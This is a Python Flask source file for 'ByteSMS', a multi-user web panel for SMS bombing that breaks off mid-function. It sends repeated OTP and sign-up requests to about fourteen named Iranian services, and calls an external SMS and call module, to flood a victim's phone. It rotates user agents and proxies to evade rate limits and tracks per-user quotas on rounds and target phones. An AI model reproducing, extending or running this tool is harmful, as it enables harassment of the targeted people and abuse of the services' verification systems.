# -*- coding: utf-8 -*-
# ByteSMS | Designed & developed by AliXByte | Sponsored by www.pixelshop24.com

import os, sys, time, json, socket, secrets, subprocess
from pathlib import Path
from datetime import datetime, timedelta
from threading import Thread, Lock, RLock
from functools import wraps
from inspect import getmembers, isfunction
import random
import requests

BASE_DIR = Path(__file__).resolve().parent
DATA_DIR = BASE_DIR / 'data'
TEMPLATE_DIR = BASE_DIR / 'templates'
STATIC_DIR = BASE_DIR / 'static'

# ساخت پوشه data اگر وجود نداشته باشد
DATA_DIR.mkdir(exist_ok=True)

# ============ Dependency bootstrap ============
def ensure_deps():
    missing = []
    for pkg, mod in [('flask', 'flask'), ('requests', 'requests'), ('werkzeug', 'werkzeug'), ('pysocks', 'socks')]:
        try: __import__(mod)
        except ImportError: missing.append(pkg)
    if not missing: return
    print()
    print("  ╔══════════════════════════════════════════════════╗")
    print("  ║  ByteSMS · Missing dependencies                  ║")
    print("  ╚══════════════════════════════════════════════════╝")
    print(f"  Missing: {', '.join(missing)}\n")
    print("  [1] Install automatically (recommended)")
    print("  [2] I'll install manually and exit")
    print()
    while True:
        try: choice = input("  Your choice [1/2]: ").strip()
        except (EOFError, KeyboardInterrupt, OSError):
            print(f"\n  [!] Install manually:\n      {sys.executable} -m pip install {' '.join(missing)}")
            sys.exit(1)
        if choice in ('1', '2'): break
        print("  Invalid. Enter 1 or 2.")
    if choice == '1':
        print(f"\n  [+] Installing: {' '.join(missing)}")
        try:
            subprocess.check_call([sys.executable, '-m', 'pip', 'install', *missing])
            print("  [+] Installed. Restarting ByteSMS...\n")
            try: os.execv(sys.executable, [sys.executable, str(Path(__file__).resolve())])
            except: sys.exit(0)
        except subprocess.CalledProcessError as e:
            print(f"  [!] Install failed: {e}"); sys.exit(1)
    else:
        print(f"\n  [i] Run this then re-launch:\n      {sys.executable} -m pip install {' '.join(missing)}")
        sys.exit(0)

ensure_deps()

from flask import Flask, request, jsonify, send_file, session, redirect, Response, send_from_directory
from werkzeug.security import generate_password_hash, check_password_hash

try:
    from lib.Api import sms, call
except ImportError:
    try:
        from Api import sms, call
    except ImportError:
        print("[!] Api.py not found — SMS/Call module disabled. HTTP endpoints still work.")
        sms = call = None

# ============ Locked branding ============
PANEL_NAME  = 'ByteSMS'
FOOTER_TEXT = 'Designed & developed by AliXByte · Sponsored by www.pixelshop24.com'

# ============ Utilities ============
def now_iso(): return datetime.now().isoformat(timespec='seconds')
def now_ts():  return time.time()

def load_config(path: Path):
    cfg = {'HOST': '0.0.0.0', 'PORT': 8080, 'SECRET_KEY': '',
           'ADMIN_USER': 'admin', 'ADMIN_PASSWORD': 'admin'}
    if path.exists():
        for line in path.read_text(encoding='utf-8').splitlines():
            line = line.strip()
            if not line or line.startswith('#') or '=' not in line: continue
            k, v = line.split('=', 1)
            cfg[k.strip().upper()] = v.strip()
    try: cfg['PORT'] = int(cfg['PORT'])
    except: cfg['PORT'] = 8080
    if not cfg['SECRET_KEY']:
        cfg['SECRET_KEY'] = secrets.token_hex(32)
        try:
            with open(path, 'a', encoding='utf-8') as f:
                f.write(f"\nSECRET_KEY={cfg['SECRET_KEY']}\n")
        except: pass
    return cfg

def atomic_write(path: Path, text: str):
    tmp = path.with_name(path.name + '.tmp')
    with open(tmp, 'w', encoding='utf-8') as f:
        f.write(text); f.flush()
        try: os.fsync(f.fileno())
        except: pass
    os.replace(tmp, path)

def normalize_phone(raw):
    d = ''.join(c for c in str(raw) if c.isdigit())
    if d.startswith('0098'): d = d[4:]
    elif d.startswith('98') and len(d) > 10: d = d[2:]
    if d.startswith('0') and len(d) > 10: d = d[1:]
    if len(d) != 10 or not d.startswith('9'): return None
    return {'national': d, 'local': '0'+d, 'intl_98': '98'+d, 'intl_plus98': '+98'+d}

CFG = load_config(DATA_DIR / 'config.txt')

# ============ Settings ============
class Settings:
    DEFAULTS = {
        'ping_interval': 60,
        'session_timeout_minutes': 60,
        'max_rounds_per_job': 500,
        'login_max_attempts': 8,
        'default_user_max_rounds': 24,
        'default_user_max_phones': 2,
        'use_proxies': True,
        'bale_bot_token': '',
        'bale_security_code': 'ByteSMS_RD',
    }
    def __init__(self, path):
        self.path = path; self._lock = RLock(); self._data = self._load()
    def _load(self):
        if self.path.exists():
            try: return {**self.DEFAULTS, **json.loads(self.path.read_text(encoding='utf-8'))}
            except: pass
        return dict(self.DEFAULTS)
    def _save(self):
        with self._lock: atomic_write(self.path, json.dumps(self._data, ensure_ascii=False, indent=2))
    def get(self, k, d=None): return self._data.get(k, self.DEFAULTS.get(k, d))
    def all(self): return dict(self._data)
    def update(self, **kwargs):
        with self._lock:
            for k, v in kwargs.items():
                if k not in self.DEFAULTS: continue
                dv = self.DEFAULTS[k]
                try:
                    if isinstance(dv, int) and not isinstance(dv, bool): v = int(v)
                    elif isinstance(dv, bool): v = bool(v)
                    else: v = str(v)
                except: continue
                self._data[k] = v
            self._save(); return dict(self._data)

SETTINGS = Settings(DATA_DIR / 'settings.json')

# ============ Proxy Store ============
class ProxyStore:
    def __init__(self, path):
        self.path = path; self._lock = RLock(); self._list = self._load()
    def _load(self):
        if self.path.exists():
            try: return [l.strip() for l in self.path.read_text(encoding='utf-8').splitlines() if l.strip()]
            except: pass
        return []
    def _save(self): atomic_write(self.path, '\n'.join(self._list))
    def all(self):
        with self._lock: return list(self._list)
    def add(self, proxies):
        with self._lock:
            existing = set(self._list); added = 0
            for p in proxies:
                p = p.strip()
                if p and p not in existing:
                    self._list.append(p); existing.add(p); added += 1
            if added: self._save()
            return added
    def remove(self, proxy):
        with self._lock:
            if proxy in self._list:
                self._list.remove(proxy); self._save(); return True
            return False
    def update(self, old_proxy, new_proxy):
        with self._lock:
            if old_proxy in self._list and new_proxy and old_proxy != new_proxy:
                idx = self._list.index(old_proxy)
                if new_proxy not in self._list:
                    self._list[idx] = new_proxy
                    self._save(); return True
            return False
    def clear(self):
        with self._lock: self._list = []; self._save()
    def get_random(self):
        with self._lock: return random.choice(self._list) if self._list else None

PROXIES = ProxyStore(DATA_DIR / 'proxies.txt')

def test_proxy(proxy, timeout=8):
    try:
        r = requests.get('https://api.ipify.org?format=json',
                         proxies={'http': proxy, 'https': proxy}, timeout=timeout)
        if r.ok: return True, r.json().get('ip', 'unknown')
        return False, f'HTTP {r.status_code}'
    except Exception as e:
        return False, str(e)[:80]

# ============ User Store ============
class UserStore:
    def __init__(self, path):
        self.path = path; self._lock = RLock(); self._data = self._load(); self._bootstrap()
    def _load(self):
        if self.path.exists():
            try:
                d = json.loads(self.path.read_text(encoding='utf-8'))
                if 'users' not in d: d = {'users': {}}
                return d
            except: pass
        return {'users': {}}
    def _save(self):
        atomic_write(self.path, json.dumps(self._data, ensure_ascii=False, indent=2))
    def _bootstrap(self):
        changed = False
        for u in self._data['users'].values():
            if 'nickname' not in u: u['nickname'] = ''; changed = True
            if 'last_ip' not in u: u['last_ip'] = None; changed = True
            if 'enabled' not in u: u['enabled'] = True; changed = True
        if CFG['ADMIN_USER'] not in self._data['users']:
            self._data['users'][CFG['ADMIN_USER']] = {
                'password_hash': generate_password_hash(CFG['ADMIN_PASSWORD'], method='pbkdf2:sha256'),
                'role': 'admin', 'max_rounds': -1, 'max_phones': -1,
                'used_rounds': 0, 'used_phones': [],
                'created_at': now_iso(), 'last_seen': None, 'status': 'offline',
                'nickname': 'Administrator', 'last_ip': None, 'enabled': True,
            }
            changed = True
        if changed: self._save()
        
    def get(self, u):
        with self._lock:
            x = self._data['users'].get(u)
            if not x: return None
            res = dict(x)
            res['username'] = u
            return res
            
    def all(self):
        with self._lock:
            return {k: {**dict(v), 'username': k} for k, v in self._data['users'].items()}
            
    def check_password(self, u, p):
        with self._lock:
            x = self._data['users'].get(u)
            if not x or not x.get('enabled', True): return False
            return bool(check_password_hash(x['password_hash'], p))
    def create(self, u, p, mr, mp, nickname=''):
        with self._lock:
            if u in self._data['users']: return False, 'Username already exists'
            if not u or len(u) < 3: return False, 'Username must be at least 3 characters'
            if not p or len(p) < 6: return False, 'Password must be at least 6 characters'
            self._data['users'][u] = {
                'password_hash': generate_password_hash(p, method='pbkdf2:sha256'),
                'role': 'user', 'max_rounds': int(mr), 'max_phones': int(mp),
                'used_rounds': 0, 'used_phones': [],
                'created_at': now_iso(), 'last_seen': None, 'status': 'offline',
                'nickname': (nickname or u).strip() or u,
                'last_ip': None, 'enabled': True,
            }
            self._save(); return True, 'ok'
    def delete(self, u):
        with self._lock:
            if u == CFG['ADMIN_USER']: return False, 'Cannot delete the primary admin'
            if u not in self._data['users']: return False, 'User not found'
            del self._data['users'][u]; self._save(); return True, 'ok'
    def reset_credentials(self, old_u, new_u, new_p):
        with self._lock:
            if old_u == CFG['ADMIN_USER']: return False, 'Cannot change primary admin username'
            if old_u not in self._data['users']: return False, 'User not found'
            if not new_u or len(new_u) < 3: return False, 'Username too short (min 3)'
            if not new_p or len(new_p) < 6: return False, 'Password too short (min 6)'
            if new_u != old_u and new_u in self._data['users']: return False, 'New username already exists'
            
            user_data = self._data['users'].pop(old_u)
            user_data['password_hash'] = generate_password_hash(new_p, method='pbkdf2:sha256')
            self._data['users'][new_u] = user_data
            self._save(); return True, 'ok'
    def update_limits(self, u, mr, mp, reset=False):
        with self._lock:
            x = self._data['users'].get(u)
            if not x: return False
            x['max_rounds'] = int(mr); x['max_phones'] = int(mp)
            if reset: x['used_rounds'] = 0; x['used_phones'] = []
            self._save(); return True
    def reset_all_usage(self):
        with self._lock:
            for x in self._data['users'].values():
                x['used_rounds'] = 0; x['used_phones'] = []
            self._save()
    def change_password(self, u, p):
        with self._lock:
            x = self._data['users'].get(u)
            if not x: return False
            x['password_hash'] = generate_password_hash(p, method='pbkdf2:sha256'); self._save(); return True
    def set_nickname(self, u, nickname):
        with self._lock:
            x = self._data['users'].get(u)
            if not x: return False
            x['nickname'] = (nickname or u).strip() or u
            self._save(); return True
    def toggle_enabled(self, u):
        with self._lock:
            if u == CFG['ADMIN_USER']: return False
            x = self._data['users'].get(u)
            if not x: return False
            x['enabled'] = not x.get('enabled', True)
            self._save(); return True
    def touch(self, u, ip=None):
        with self._lock:
            x = self._data['users'].get(u)
            if x:
                x['last_seen'] = now_iso(); x['status'] = 'online'
                if ip: x['last_ip'] = ip
                self._save()
    def update_statuses(self, now_val):
        with self._lock:
            ch = False
            for x in self._data['users'].values():
                last = x.get('last_seen'); ts = 0
                if last:
                    try: ts = datetime.fromisoformat(last).timestamp()
                    except: pass
                ns = 'online' if (now_val - ts) < 90 else 'offline'
                if x.get('status') != ns: x['status'] = ns; ch = True
            if ch: self._save()
    def check_limits(self, u, rounds, phone):
        with self._lock:
            x = self._data['users'].get(u)
            if not x or not x.get('enabled', True): return False, 'Account disabled or not found'
            if x['role'] == 'admin': return True, None
            mr = x['max_rounds']
            if mr >= 0 and x['used_rounds'] + rounds > mr:
                return False, f"Round quota exceeded (remaining: {max(0, mr-x['used_rounds'])})"
            mp = x['max_phones']
            n = normalize_phone(phone); key = n['national'] if n else phone
            if mp >= 0 and key not in x['used_phones'] and len(x['used_phones']) >= mp:
                return False, f"Phone limit reached (max {mp})"
            return True, None
    def consume(self, u, rounds, phone):
        with self._lock:
            x = self._data['users'].get(u)
            if not x: return
            x['used_rounds'] += rounds
            n = normalize_phone(phone); key = n['national'] if n else phone
            if key not in x['used_phones']: x['used_phones'].append(key)
            self._save()
    def import_users(self, users_dict):
        with self._lock:
            added = 0
            for u, data in users_dict.items():
                if u not in self._data['users']:
                    self._data['users'][u] = data
                    added += 1
            if added: self._save()
            return added
    def backup_json(self):
        with self._lock: return json.dumps(self._data, ensure_ascii=False, indent=2)

# ============ Log Store ============
class LogStore:
    def __init__(self, path, max_entries=2000):
        self.path = path; self.max = max_entries
        self._lock = RLock(); self._entries = self._load()
        self._counter = max([int(e.get('id', 0)) for e in self._entries] + [0])
    def _load(self):
        if self.path.exists():
            try: return json.loads(self.path.read_text(encoding='utf-8'))
            except: pass
        return []
    def _save(self):
        atomic_write(self.path, json.dumps(self._entries, ensure_ascii=False, indent=2))
    def add(self, **f):
        with self._lock:
            self._counter += 1
            e = {'id': self._counter, **f}
            self._entries.append(e)
            if len(self._entries) > self.max: self._entries = self._entries[-self.max:]
            self._save(); return e['id']
    def update(self, eid, **f):
        with self._lock:
            for e in self._entries:
                if e.get('id') == eid:
                    e.update(f); self._save(); return True
            return False
    def list(self, username=None, is_admin=False, limit=200):
        with self._lock:
            es = self._entries
            if not is_admin and username: es = [e for e in es if e.get('username') == username]
            return [dict(e) for e in es[-limit:][::-1]]
    def reset(self):
        with self._lock: self._entries = []; self._counter = 0; self._save()

# ============ Ping Monitor ============
class PingMonitor:
    def __init__(self):
        self._lock = RLock()
        self._status = {'online': False, 'avg_ms': None, 'google': None, 'cloudflare': None, 'last_check': None}
        Thread(target=self._loop, daemon=True).start()
    def _ping(self, host, port=53, timeout=3):
        try:
            s = time.time()
            sock = socket.create_connection((host, port), timeout=timeout); sock.close()
            return round((time.time()-s)*1000, 1)
        except: return None
    def _check(self):
        g = self._ping('8.8.8.8'); c = self._ping('1.1.1.1')
        vals = [x for x in (g, c) if x is not None]
        avg = round(sum(vals)/len(vals), 1) if vals else None
        st = {'online': bool(vals), 'avg_ms': avg, 'google': g, 'cloudflare': c, 'last_check': now_iso()}
        with self._lock: self._status = st
    def _loop(self):
        while True:
            try: self._check()
            except: pass
            try: time.sleep(max(10, SETTINGS.get('ping_interval', 60)))
            except: time.sleep(60)
    def get(self):
        with self._lock: return {'current': dict(self._status)}

# ============ Bootstrap ============
USERS = UserStore(DATA_DIR / 'users.txt')
LOGS = LogStore(DATA_DIR / 'logs.txt')
PINGER = PingMonitor()

app = Flask(__name__, template_folder=str(TEMPLATE_DIR), static_folder=str(STATIC_DIR))
app.secret_key = CFG['SECRET_KEY']
app.config['SESSION_COOKIE_HTTPONLY'] = True
app.config['SESSION_COOKIE_SAMESITE'] = 'Lax'
app.permanent_session_lifetime = timedelta(days=7)

# ============ Job control ============
job_states, job_logs, job_lock = {}, {}, RLock()
stop_flags = {}

def job_log(u, msg):
    with job_lock:
        lst = job_logs.setdefault(u, [])
        lst.append(f"[{datetime.now().strftime('%H:%M:%S')}] {msg}")
        if len(lst) > 200: job_logs[u] = lst[-200:]

def set_phase(u, phase, rnd=None, total=None):
    with job_lock:
        st = job_states.setdefault(u, {'running': False, 'phase': '', 'round': 0, 'total_rounds': 0})
        st['phase'] = phase
        if rnd is not None: st['round'] = rnd
        if total is not None: st['total_rounds'] = total

def is_stopped(u):
    with job_lock: return stop_flags.get(u, False)
def set_stop(u, v):
    with job_lock: stop_flags[u] = v

# ============ Phases ============
def phase1(username, fmt, count):
    if sms is None:
        job_log(username, "SMS module not available"); return True
    sms_n = [n for n, _ in getmembers(sms, isfunction)]
    call_n = [n for n, _ in getmembers(call, isfunction)] if call else []
    target = fmt['intl_plus98']; x = 0
    for j in range(count):
        if is_stopped(username):
            job_log(username, "Force stop requested."); return False
        set_phase(username, 'SMS Phase', rnd=j+1, total=count)
        for name in sms_n:
            try: Thread(target=getattr(sms, name), args=[target], daemon=True).start()
            except: pass
        if j != 0 and j % 5 == 0 and call_n:
            try: Thread(target=getattr(call, call_n[x]), args=[target], daemon=True).start()
            except: pass
            x = (x + 1) % len(call_n)
        job_log(username, f"Round {j+1} completed")
        time.sleep(0.2)
    return True

ENDPOINTS = [
    ("https://auth.basalam.com/otp-request", lambda f: {"mobile": f['local']}),
    ("https://api.divar.ir/v5/auth/authenticate", lambda f: {"phone": f['national']}),
    ("https://app.snapp.taxi/api/api-passenger-oauth/v2/otp", lambda f: {"cellphone": f['intl_plus98']}),
    ("https://snappfood.ir/mobile/v2/user/loginMobileWithNoPass?lat=35.774&long=51.418&optionalClient=WEBSITE&client=WEBSITE&deviceType=WEBSITE&appVersion=8.1.1&UDID=4a2dcc5a-4b65-4b72-a3ab-c6cdcc6e1737&locale=fa", lambda f: {"cellphone": f['local']}),
    ("https://www.sheypoor.com/api/v10.0.0/auth/send", lambda f: {"username": f['local']}),
    ("https://ws.alibaba.ir/api/v3/account/mobile/otp", lambda f: {"phoneNumber": f['intl_plus98']}),
    ("https://cinematicket.org/api/v1/users/signup", lambda f: {"phone_number": f['intl_98']}),
    ("https://api.digikala.com/v1/user/authenticate/", lambda f: {"backUrl": "/", "username": f['local']}),
    ("https://api.digikalajet.ir/user/login-register/", lambda f: {"phone": f['local']}),
    ("https://virgool.io/api/v1.4/auth/verify", lambda f: {"method": "phone", "identifier": f['intl_plus98']}),
    ("https://www.aparat.com/api/fa/v1/user/Authenticate/signin_step1?callbackType=postmessage",
     lambda f: {"temp_id": "474674", "account": "0", "codepass_type": "otp",
                "guid": "3433103F-9DE0-6E66-5829-B02DFE66EEF0" + f['national']}),
    ("https://auth.telewebion.com/user/authenticate", lambda f: {"field": "+98", "type": "mobile" + f['national']}),
    ("https://cpanel.snapp-box.com/api/v2/auth/otp/send", lambda f: {"phoneNumber": f['local']}),
    ("https://api.tapsi.cab/api/v2/user", lambda f: {"credential": {"phoneNumber": f['national'], "role": "PASSENGER"}}),
]

HEADS = [
    {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36', 'Accept': '*/*'},
    {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0', 'Accept': '*/*'},
    {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15', 'Accept': '*/*'},
]

def phase2(username, fmt, count):
    use_proxy = SETTINGS.get('use_proxies', True)
    for k in range(count):
        if is_stopped(username):
            job_log(username, "Force stop requested."); return False
        set_phase(username, 'HTTP Phase', rnd=k+1, total=count)
        h = random.choice(HEADS)
        proxy_url = PROXIES.get_random() if (use_proxy and PROXIES.all()) else None
        proxy_kw = {'proxies': {'http': proxy_url, 'https': proxy_url}} if proxy_url else {}
        for url, builder in ENDPOINTS:
            try: requests.post(url=url, json=builder(fmt), headers=h, timeout=6, **proxy_kw)
            except: pass
        job_log(username, f"Round {k+1} completed" + (" via proxy" if proxy_url else ""))
    return True

def run_job(username, log_id, phone, rounds):
    stopped = False
    try:
        set_stop(username, False)
        fmt = normalize_phone(phone)
        job_log(username, f"Job started: {fmt['local']} x {rounds}")
        if not phase1(username, fmt, rounds): stopped = True; return
        if not phase2(username, fmt, rounds): stopped = True; return
        job_log(username, "Completed.")
        LOGS.update(log_id, status='completed', end_time=now_iso())
    except Exception as e:
        job_log(username, f"Error: {e}")
        LOGS.update(log_id, status='error', end_time=now_iso(), error=str(e))
    finally:
        if stopped: LOGS.update(log_id, status='stopped', end_time=now_iso())
        with job_lock:
            st = job_states.get(username)
            if st: st['running'] = False; st['phase'] = 'Finished'
        set_stop(username, False)

# ============ Auth & security ============
login_attempts = {}; LOGIN_LOCK = Lock()

def check_login_rate(ip):
    mx = max(1, SETTINGS.get('login_max_attempts', 8))
    with LOGIN_LOCK:
        n = time.time(); cnt, ts = login_attempts.get(ip, (0, n))
        if n - ts > 60: login_attempts[ip] = (1, n); return True
        if cnt >= mx: return False
        login_attempts[ip] = (cnt + 1, ts); return True

def login_required(f):
    @wraps(f)
    def w(*a, **k):
        if not session.get('username'):
            if request.method == 'POST' or request.path.startswith('/api/'):
                return jsonify({'error': 'unauthorized'}), 401
            return redirect('/login')
        return f(*a, **k)
    return w

def admin_required(f):
    @wraps(f)
    def w(*a, **k):
        if not session.get('username'):
            return jsonify({'error': 'unauthorized'}), 401
        u = USERS.get(session['username'])
        if not u or u.get('role') != 'admin':
            return jsonify({'error': 'forbidden'}), 403
        return f(*a, **k)
    return w

CSRF_EXEMPT = {'/login'}

@app.before_request
def _before():
    if session.get('username'):
        if not session.get('csrf'):
            session['csrf'] = secrets.token_hex(16)

        timeout_mins = int(SETTINGS.get('session_timeout_minutes', 60))
        last_activity = session.get('last_activity', 0)
        if time.time() - last_activity > (timeout_mins * 60):
            session.clear()
            if request.path.startswith('/api/'):
                return jsonify({'error': 'session expired'}), 401
            return redirect('/login')
        
        session['last_activity'] = time.time()
        session.permanent = True

        if request.method in ('POST', 'PUT', 'DELETE', 'PATCH') and request.path.startswith('/api/'):
            if request.path not in CSRF_EXEMPT:
                expected = session.get('csrf'); actual = request.headers.get('X-CSRF-Token')
                if not expected or actual != expected:
                    return jsonify({'error': 'csrf token invalid — please refresh (F5)'}), 403
                    
        USERS.touch(session['username'], request.remote_addr or '')

@app.after_request
def _resp_after(resp):
    resp.headers['X-Content-Type-Options'] = 'nosniff'
    resp.headers['X-Frame-Options'] = 'DENY'
    resp.headers['Referrer-Policy'] = 'same-origin'
    resp.headers['Content-Security-Policy'] = "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; img-src 'self' data:;"
    return resp

# ============ Routes ============
@app.route('/health')
def health(): return jsonify({'ok': True, 'ts': now_ts()})

@app.route('/api/branding')
def branding():
    return jsonify({'panel_name': PANEL_NAME, 'footer_text': FOOTER_TEXT})

@app.route('/login', methods=['GET', 'POST'])
def login_route():
    if request.method == 'POST':
        ip = request.remote_addr or '0.0.0.0'
        if not check_login_rate(ip):
            return jsonify({'error': 'Too many attempts. Wait a minute.'}), 429
        d = request.get_json(silent=True) or {}
        u = str(d.get('username', '')).strip(); p = str(d.get('password', ''))
        if USERS.check_password(u, p):
            session.clear(); session.permanent = True
            session['username'] = u
            session['csrf'] = secrets.token_hex(16)
            session['last_activity'] = time.time()
            USERS.touch(u, ip)
            return jsonify({'ok': True})
        return jsonify({'error': 'Invalid username or password'}), 401
    if session.get('username'): return redirect('/')
    return send_file(str(TEMPLATE_DIR / 'login.html'))

@app.route('/logout')
def logout_route(): session.clear(); return redirect('/login')

@app.route('/')
@login_required
def index_route(): return send_file(str(TEMPLATE_DIR / 'index.html'))

@app.route('/favicon.ico')
def favicon():
    return send_from_directory(STATIC_DIR, 'favicon.ico', mimetype='image/vnd.microsoft.icon')

@app.route('/api/me')
@login_required
def api_me():
    u = USERS.get(session['username']); u.pop('password_hash', None)
    u['csrf'] = session.get('csrf', '')
    return jsonify(u)

@app.route('/api/settings', methods=['GET', 'POST'])
@login_required
def api_settings():
    if request.method == 'GET':
        s = SETTINGS.all()
        s['panel_name']  = PANEL_NAME
        s['footer_text'] = FOOTER_TEXT
        return jsonify(s)
    u = USERS.get(session['username'])
    if not u or u.get('role') != 'admin': return jsonify({'error': 'forbidden'}), 403
    d = request.get_json(silent=True) or {}
    d.pop('panel_name', None); d.pop('footer_text', None)
    out = SETTINGS.update(**d)
    out['panel_name'] = PANEL_NAME; out['footer_text'] = FOOTER_TEXT
    return jsonify(out)

@app.route('/api/ping')
@login_required
def api_ping(): return jsonify(PINGER.get())

@app.route('/api/heartbeat', methods=['POST'])
@login_required
def api_heartbeat():
    USERS.touch(session['username'], request.remote_addr or '')
    return jsonify({'ok': True})

@app.route('/api/run', methods=['POST'])
@login_required
def api_run():
    username = session['username']
    d = request.get_json(silent=True) or {}
    phone = str(d.get('phone', '')).strip()
    try: rounds = int(d.get('rounds', 0))
    except: return jsonify({'error': 'Invalid round count'}), 400
    if not normalize_phone(phone): return jsonify({'error': 'Invalid phone number'}), 400
    mx = int(SETTINGS.get('max_rounds_per_job', 500))
    if rounds < 1 or rounds > mx:
        return jsonify({'error': f'Rounds must be between 1 and {mx}'}), 400
    ok, err = USERS.check_limits(username, rounds, phone)
    if not ok: return jsonify({'error': err}), 400
    with job_lock:
        st = job_states.setdefault(username, {'running': False, 'phase': '', 'round': 0, 'total_rounds': 0})
        if st['running']: return jsonify({'error': 'Another operation is running'}), 400
        st.update({'running': True, 'phase': 'Starting...', 'round': 0, 'total_rounds': rounds})
        job_logs[username] = []; stop_flags[username] = False
    USERS.consume(username, rounds, phone)
    log_id = LOGS.add(username=username, phone=normalize_phone(phone)['local'],
                      rounds=rounds, start_time=now_iso(), end_time=None, status='running')
    Thread(target=run_job, args=(username, log_id, phone, rounds), daemon=True).start()
    return jsonify({'ok': True, 'log_id': log_id})

@app.route('/api/stop', methods=['POST'])
@login_required
def api_stop():
    set_stop(session['username'], True); return jsonify({'ok': True})

@app.route('/api/progress')
@login_required
def api_progress():
    with job_lock:
        st = dict(job_states.get(session['username'], {'running': False, 'phase': '', 'round': 0, 'total_rounds': 0}))
        st['logs'] = list(job_logs.get(session['username'], []))[-60:]
    return jsonify(st)

@app.route('/api/logs')
@login_required
def api_logs():
    u = USERS.get(session['username'])
    return jsonify(LOGS.list(username=session['username'], is_admin=(u.get('role') == 'admin')))

@app.route('/api/logs/reset', methods=['POST'])
@admin_required
def api_logs_reset(): LOGS.reset(); return jsonify({'ok': True})

@app.route('/api/change-password', methods=['POST'])
@login_required
def api_change_password():
    d = request.get_json(silent=True) or {}
    old = str(d.get('old_password', '')); new = str(d.get('new_password', ''))
    if len(new) < 6: return jsonify({'error': 'New password must be at least 6 characters'}), 400
    username = session['username']
    if not USERS.check_password(username, old):
        return jsonify({'error': 'Current password is incorrect'}), 400
    USERS.change_password(username, new); session.clear()
    return jsonify({'ok': True, 'redirect': '/login'})

@app.route('/api/me/nickname', methods=['POST'])
@login_required
def api_me_nickname():
    d = request.get_json(silent=True) or {}
    nick = str(d.get('nickname', '')).strip()
    if len(nick) > 40: return jsonify({'error': 'Nickname too long (max 40)'}), 400
    USERS.set_nickname(session['username'], nick)
    return jsonify({'ok': True})

@app.route('/api/users', methods=['GET', 'POST'])
@admin_required
def api_users():
    if request.method == 'GET':
        us = USERS.all()
        for x in us.values(): x.pop('password_hash', None)
        return jsonify(us)
    d = request.get_json(silent=True) or {}
    mr = d.get('max_rounds', SETTINGS.get('default_user_max_rounds', 24))
    mp = d.get('max_phones', SETTINGS.get('default_user_max_phones', 2))
    ok, msg = USERS.create(str(d.get('username', '')).strip(),
                           str(d.get('password', '')),
                           int(mr), int(mp),
                           nickname=str(d.get('nickname', '')).strip())
    if not ok: return jsonify({'error': msg}), 400
    return jsonify({'ok': True})

@app.route('/api/users/<username>', methods=['DELETE'])
@admin_required
def api_user_delete(username):
    ok, msg = USERS.delete(username)
    if not ok: return jsonify({'error': msg}), 400
    return jsonify({'ok': True})

@app.route('/api/users/<username>/limits', methods=['POST'])
@admin_required
def api_user_limits(username):
    d = request.get_json(silent=True) or {}
    USERS.update_limits(username, int(d.get('max_rounds', -1)), int(d.get('max_phones', -1)),
                        reset=bool(d.get('reset_usage', False)))
    return jsonify({'ok': True})

@app.route('/api/users/<username>/nickname', methods=['POST'])
@admin_required
def api_user_nickname(username):
    d = request.get_json(silent=True) or {}
    nick = str(d.get('nickname', '')).strip()
    if len(nick) > 40: return jsonify({'error': 'Nickname too long (max 40)'}), 400
    if not USERS.set_nickname(username, nick):
        return jsonify({'error': 'User not found'}), 404
    return jsonify({'ok': True})

@app.route('/api/users/<username>/reset', methods=['POST'])
@admin_required
def api_user_reset(username):
    d = request.get_json(silent=True) or {}
    new_u = str(d.get('new_username', '')).strip()
    new_p = str(d.get('new_password', '')).strip()
    ok, msg = USERS.reset_credentials(username, new_u, new_p)
    if not ok: return jsonify({'error': msg}), 400
    return jsonify({'ok': True})

@app.route('/api/users/<username>/toggle', methods=['POST'])
@admin_required
def api_user_toggle(username):
    if not USERS.toggle_enabled(username):
        return jsonify({'error': 'Cannot toggle this user'}), 400
    return jsonify({'ok': True})

@app.route('/api/users/reset-all-usage', methods=['POST'])
@admin_required
def api_users_reset_all(): USERS.reset_all_usage(); return jsonify({'ok': True})

@app.route('/api/users/backup')
@admin_required
def api_users_backup():
    return Response(USERS.backup_json(), mimetype='application/json',
                    headers={'Content-Disposition': 'attachment; filename="users_backup.json"'})

@app.route('/api/users/import', methods=['POST'])
@admin_required
def api_users_import():
    d = request.get_json(silent=True) or {}
    if 'users' not in d: return jsonify({'error': 'Invalid backup format'}), 400
    added = USERS.import_users(d['users'])
    return jsonify({'ok': True, 'added': added})

# ===== Proxies =====
@app.route('/api/proxies', methods=['GET', 'POST', 'DELETE'])
@admin_required
def api_proxies():
    if request.method == 'GET':
        return jsonify({'proxies': PROXIES.all(), 'use_proxies': SETTINGS.get('use_proxies', True)})
    if request.method == 'POST':
        d = request.get_json(silent=True) or {}
        raw = d.get('proxies', [])
        if isinstance(raw, str): raw = [l for l in raw.splitlines() if l.strip()]
        added = PROXIES.add(raw)
        return jsonify({'ok': True, 'added': added})
    d = request.get_json(silent=True) or {}
    p = d.get('proxy')
    if p == '__all__':
        PROXIES.clear(); return jsonify({'ok': True})
    return jsonify({'ok': PROXIES.remove(p)})

@app.route('/api/proxies/update', methods=['POST'])
@admin_required
def api_proxies_update():
    d = request.get_json(silent=True) or {}
    if PROXIES.update(d.get('old'), d.get('new')):
        return jsonify({'ok': True})
    return jsonify({'error': 'Could not update proxy'}), 400

@app.route('/api/proxies/test', methods=['POST'])
@admin_required
def api_proxies_test():
    d = request.get_json(silent=True) or {}
    p = d.get('proxy')
    if not p: return jsonify({'error': 'proxy required'}), 400
    ok, info = test_proxy(p); return jsonify({'ok': ok, 'info': info})

@app.route('/api/proxies/test-all', methods=['POST'])
@admin_required
def api_proxies_test_all():
    proxies = PROXIES.all(); results = {}
    def t(p): results[p] = test_proxy(p, timeout=6)
    threads = [Thread(target=t, args=(p,), daemon=True) for p in proxies]
    for th in threads: th.start()
    for th in threads: th.join(timeout=10)
    out = [{'proxy': p, 'ok': results.get(p, (False, 'timeout'))[0],
            'info': results.get(p, (False, 'timeout'))[1]} for p in proxies]
    return jsonify({'results': out})

@app.route('/api/proxies/export')
@admin_required
def api_proxies_export():
    content = '\n'.join(PROXIES.all())
